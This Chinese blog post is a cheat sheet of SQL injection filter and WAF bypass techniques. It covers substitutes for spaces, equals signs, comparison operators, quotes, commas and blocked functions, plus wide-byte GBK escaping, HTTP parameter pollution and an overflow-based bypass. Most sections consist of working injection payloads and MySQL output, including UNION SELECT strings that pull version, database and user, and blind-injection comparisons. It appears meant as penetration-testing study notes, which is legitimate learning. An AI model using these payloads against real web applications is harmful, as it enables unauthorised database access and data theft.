title="空格过滤绕过"></a>空格过滤绕过</h1><p>一般绕过空格过滤的方法有以下几种方法来取代空格</p><ol><li><code>/**/</code>或者<code>/*1*/</code></li><li><code>()</code></li><li><code>%0d %0a %0c %0b %a0</code></li><li><code>+</code></li><li>回车(url编码中的<code>%0a</code>)</li><li>`&#96;&#96;(tap键上面的按钮) （<code>*</code>无法使用）</li><li>Tab</li><li>双写空格绕过</li><li>双写括号绕过</li><li>上面的编码试试</li><li>科学计数法绕过<br>select Afrom B 默认from前面必须是空格，因此为了不让你使用from可能正则表达式会检测前面的空格，我们可以用科学计数法绕过，因为1e0后面可以没有空格</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select A,1E0fromB</span><br></pre></td></tr></table></figure><p>这里的逗号是两列的意思 1e0占了第二列，同样，上面的1E0可以用1.0代替</p><ol><li><code>\N</code> 绕过 \N相当于NULL</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pass where id=\Nunion select 1,2, greatest((substr((select username from users limit 1 offset 0),1,1)),&#x27;v&#x27;)in(&#x27;v&#x27;);</span><br></pre></td></tr></table></figure><ol><li>id 与from在之间的空格绕过</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select+id-1+1.from users;`</span><br><span class="line">`select-id-1+3.from users;</span><br></pre></td></tr></table></figure><p>注意：第二句得到的id将会是 -id+2</p><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select/**/*/**/from/**/users;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">|  2 | user2    | pass1    |</span><br><span class="line">|  3 | test3    | pass1    |</span><br><span class="line">+----+----------+----------+</span><br><span class="line"></span><br><span class="line">注意括号中不能含有*</span><br><span class="line"></span><br><span class="line">mysql&gt; select(id)from(users);</span><br><span class="line">+----+</span><br><span class="line">| id |</span><br><span class="line">+----+</span><br><span class="line">|  1 |</span><br><span class="line">|  3 |</span><br><span class="line"></span><br><span class="line">mysql&gt; select</span><br><span class="line">    -&gt; *</span><br><span class="line">    -&gt; from </span><br><span class="line">    -&gt; users</span><br><span class="line">    -&gt; where </span><br><span class="line">    -&gt; id = 1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select`id`from`users`where`id`=1;</span><br><span class="line">+----+</span><br><span class="line">| id |</span><br><span class="line">+----+</span><br><span class="line">|  1 |</span><br><span class="line">+----+</span><br></pre></td></tr></table></figure><h1 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号 &#x3D; 绕过"></a>过滤等号 &#x3D; 绕过</h1><h2 id="不加通配符的like"><a href="#不加通配符的like" class="headerlink" title="不加通配符的like"></a>不加通配符的like</h2><p>不加通配符的like执行的效果和&#x3D;一致，所以可以用来绕过。<br>正常加上通配符的like：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username like &quot;test%&quot;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">|  3 | test3    | pass1    |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><p>不加上通配符的like可以用来取代&#x3D;：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id like 1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><h2 id="rlike"><a href="#rlike" class="headerlink" title="rlike"></a>rlike</h2><p>模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来 用来取代&#x3D;时，rlike的用法和上面的like一样，没有通配符效果和&#x3D;一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id rlike 1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><h2 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h2><p>MySQL 中使用 REGEXP 操作符来进行正则表达式匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id regexp 1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><h2 id="使用大小于号来绕过"><a href="#使用大小于号来绕过" class="headerlink" title="使用大小于号来绕过"></a>使用大小于号来绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id &gt; 1 and id &lt; 3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  2 | user2    | pass1    |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="&lt;&gt;"></a>&lt;&gt;</h2><p>&lt;&gt; 等价于 !&#x3D; 所以在前面再加一个!结果就是等号了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where !(id &lt;&gt; 1);</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id = 1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>等号绕过也可以使用 strcmp(str1,str2) 函数、between 关键字等，具体可以参考后面的过滤大小于号绕过</p><h1 id="过滤大小于号绕过"><a href="#过滤大小于号绕过" class="headerlink" title="过滤大小于号绕过"></a>过滤大小于号绕过</h1><p>在 sql 盲注中，一般使用大小于号来判断 ascii 码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，那就凉凉。怎么会呢，可以使用以下的关键字来绕过</p><h2 id="greatest"><a href="#greatest" class="headerlink" title="greatest()"></a>greatest()</h2><p>greatest(n1, n2, n3…): 返回 n 中的最大值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><h2 id="least"><a href="#least" class="headerlink" title="least()"></a>least()</h2><p>least(n1,n2,n3…): 返回 n 中的最小值</p><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h2><p>strcmp(str1,str2): 若所有的字符串均相同，则返回 STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117);</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),116);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="in-关键字"><a href="#in-关键字" class="headerlink" title="in 关键字"></a>in 关键字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and substr(username,1,1) in (&#x27;t&#x27;);</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id = 1 and substr(username,1,1) in (&#x27;y&#x27;);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="between-a-and-b"><a href="#between-a-and-b" class="headerlink" title="between a and b"></a>between a and b</h2><p>between a and b: 范围在 a-b 之间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id between 1 and 2;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">|  2 | user2    | pass1    |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id = 1 and substr(username,1,1) between &#x27;a&#x27; and &#x27;b&#x27;;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id = 1 and substr(username,1,1) between &#x27;a&#x27; and &#x27;t&#x27;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>使用 between a and b 判等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and substr(username,1,1) between &#x27;t&#x27; and &#x27;t&#x27;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><h1 id="利用过滤删除绕过"><a href="#利用过滤删除绕过" class="headerlink" title="利用过滤删除绕过"></a>利用过滤删除绕过</h1><p>比如说他过滤了<code>/**/</code>（将其删除）又过滤了select那么我们可以这么写<code>sel/**/ect.</code><br>意思就是被删除的可以加在另一个要删除的里面，这样不仅不会识别，删除后又还原了，实现绕过，这里面还包括双写被过滤字符的方法</p><h1 id="拆分字符串绕过"><a href="#拆分字符串绕过" class="headerlink" title="+ - . 拆分字符串绕过"></a>+ - . 拆分字符串绕过</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ or ‘11+11’=’11+11’`</span><br><span class="line">`-`和`.</span><br></pre></td></tr></table></figure><h1 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h1><h2 id="使用十六进制"><a href="#使用十六进制" class="headerlink" title="使用十六进制"></a>使用十六进制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273;</span><br></pre></td></tr></table></figure><h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p>常用在 web 应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。</p><p>简单的讲一下，一般当引号被过滤就会在引号前加一个\，将其转义失去作用，这样我们就不能闭合引号完成注入了。但是如果他的字符集设置为了双字节，也就是说两个字符可以代表一个中文的情况，那么我们就可以构造成一个中文字，\的url是%27我们在引号前写上%df，那么%df%27构成了中文的繁体运,引号就没有被过滤，成功绕过。当然不只是%df只要在那个字符集的范围内都可以。如%bf%27 %df%27 %aa%27</p><h2 id="过滤单引号时"><a href="#过滤单引号时" class="headerlink" title="过滤单引号时"></a>过滤单引号时</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%bf%27 %df%27 %aa%27</span><br><span class="line"> %df\’ = %df%5c%27=縗’</span><br></pre></td></tr></table></figure><h1 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h1><p>sql 盲注时常用到以下的函数：</p><h2 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h2><ul><li>substr(string, pos, len): 从 pos 开始，取长度为 len 的子串</li><li>substr(string, pos): 从 pos 开始，取到 string 的最后</li></ul><h2 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h2><p>用法和substr()一样</p><h2 id="mid"><a href="#mid" class="headerlink" title="mid()"></a>mid()</h2><p>用法和substr()一样，但是mid()是为了向下兼容VB6.0，已经过时，以上的几个函数的 pos 都是从 1 开始的</p><h2 id="left-和-right"><a href="#left-和-right" class="headerlink" title="left() 和 right()"></a>left() 和 right()</h2><p>left(string, len) 和 right(string, len): 分别是从左或从右取 string 中长度为 len 的子串</p><h2 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h2><p>limit pos len: 在返回项中从 pos 开始去 len 个返回值，pos 的从 0 开始</p><h2 id="ascii-和-char"><a href="#ascii-和-char" class="headerlink" title="ascii() 和 char()"></a>ascii() 和 char()</h2><ul><li>ascii(char): 把 char 这个字符转为 ascii 码</li><li>char(ascii_int): 和 ascii() 的作用相反，将 ascii 码转字符</li></ul><h2 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h2><p>可以用来过空格和正则，特殊情况下还可以将其做注释符用(单行或多行注释)实际上是mysql别名的用法详见大佬<a href="http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/">雨神的博客</a></p><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>回到正题，如果 waf 过滤了逗号，并且只能盲注（盲注基本离不开逗号啊。。），在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中 pos 代表从 pos 个开始读取 len 长度的子串 例如在substr()等函数中，常规的写法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(&quot;string&quot;,1,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| substr(&quot;string&quot;,1,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| str                  |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p>如果过滤了逗号，可以这样使用from pos for len来取代</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(&quot;string&quot; from 1 for 3);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| substr(&quot;string&quot; from 1 for 3) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| str                           |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>在 sql 盲注中，如果过滤逗号，以下参考下面的写法绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 120;</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| ascii(substr(database() from 1 for 1)) &gt; 120 |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">|                                            0 |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 110;</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| ascii(substr(database() from 1 for 1)) &gt; 110 |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">|                                            1 |</span><br><span class="line">+----------------------------------------------+</span><br></pre></td></tr></table></figure><p>也可使用join关键字来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users  union select * from (select 1)a join (select 2)b join(select 3)c;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">|  2 | user2    | pass1    |</span><br><span class="line">|  3 | test3    | pass1    |</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><p>其中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select * from (select 1)a join (select 2)b join(select 3)c</span><br></pre></td></tr></table></figure><p>等价于<br><code>union select 1,2,3</code></p><p>使用like关键字 适用于substr()等提取子串的函数中的逗号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(substr(user(),1,1))=114;</span><br><span class="line">+-------------------------------+</span><br><span class="line">| ascii(substr(user(),1,1))=114 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|                             1 |</span><br><span class="line">+-------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select user() like &quot;r%&quot;;</span><br><span class="line">+------------------+</span><br><span class="line">| user() like &quot;r%&quot; |</span><br><span class="line">+------------------+</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select user() like &quot;t%&quot;;</span><br><span class="line">+------------------+</span><br><span class="line">| user() like &quot;t%&quot; |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>使用 offset 关键字 适用于limit中的逗号被过滤的情况 limit 2,1等价于limit 1 offset 2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users limit 2,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  3 | test3    | pass1    |</span><br><span class="line">+----+----------+----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users limit 1 offset 2;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  3 | test3    | pass1    |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><h1 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h1><ul><li>sleep() –&gt;benchmark()</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 12,23 and sleep(1);</span><br><span class="line">+----+-----------------+</span><br><span class="line">| 12 | 23 and sleep(1) |</span><br><span class="line">+----+-----------------+</span><br><span class="line">| 12 |               0 |</span><br><span class="line">+----+-----------------+</span><br><span class="line">1 row in set (1.00 sec)</span><br></pre></td></tr></table></figure><p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。</p><p>BENCHMARK()函数重复countTimes次执行表达式expr,执行的时间长了，也达到了sleep的作用。</p><p>参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 12,23 and benchmark(1000000000,1);</span><br><span class="line">+----+--------------------------------+</span><br><span class="line">| 12 | 23 and benchmark(1000000000,1) |</span><br><span class="line">+----+--------------------------------+</span><br><span class="line">| 12 |                              0 |</span><br><span class="line">+----+--------------------------------+</span><br><span class="line">1 row in set (4.61 sec)</span><br></pre></td></tr></table></figure><p>在sqlsever 中用 waitfor delay</p><p>在Oracle 中用 DBMS_PIPE.RECEIVE_MESSAGE()函数和CASEWHEN„THEN„语句</p><ul><li>ascii()–&gt;hex()、bin() 替代之后再使用对应的进制转 string 即可</li><li>group_concat()–&gt;concat_ws()</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(&quot;str1&quot;,&quot;str2&quot;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| group_concat(&quot;str1&quot;,&quot;str2&quot;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| str1str2                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>substr(),substring(),mid() 可以相互取代, 取子串的函数还有 left(),right()</p></li><li><p>user() –&gt; @@user、datadir–&gt;@@datadir</p></li><li><p>ord()–&gt;ascii(): 这两个函数在处理英文时效果一样，但是处理中文等时不一致。</p></li><li><p>hex()、bin()&#x3D;ascii()</p></li><li><p>concat_ws()&#x3D;group_concat()</p></li><li><p>mid()、substr()&#x3D;substring()</p></li><li><p>@@user &#x3D;&#x3D;&gt; user()</p></li><li><p>@@datadir &#x3D;&#x3D;&gt; datadir()</p></li><li><p>@@version &#x3D;&#x3D;&gt; version()</p></li><li><p>http参数污染<code>（id=1 union select+1,2,3+from+users+where+id=1–</code>变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select+1&amp;id=2,3+from+users+where+id=1– `）</span><br></pre></td></tr></table></figure></li><li><p>第一个参数为分隔符</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">| str1,str2                    |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure><h1 id="缓冲区溢出绕过"><a href="#缓冲区溢出绕过" class="headerlink" title="缓冲区溢出绕过"></a>缓冲区溢出绕过</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+</span><br></pre></td></tr></table></figure><p>其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。一般会存在临界值其实这种方法还对后缀名的绕过也有用)</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/">yulegeyu博客</a></p><p><a href="https://www.runoob.com/sql/sql-tutorial.html">runoob SQL 教程</a></p><p><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313">sql注入绕过方法总结</a></p><p>原文作者：<a href="http://www.loongten.com/">keacwu</a></p><p>原文链接：<a href="http://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/">http://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/</a></p><p>发表日期：<a href="http://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/">December 28th 2019, 6:03:58 pm</a></p><p>更新日期：<a href="http://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/">March 6th 2020, 4:19:13 pm</a></p><p>版权声明：本文采用<a href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
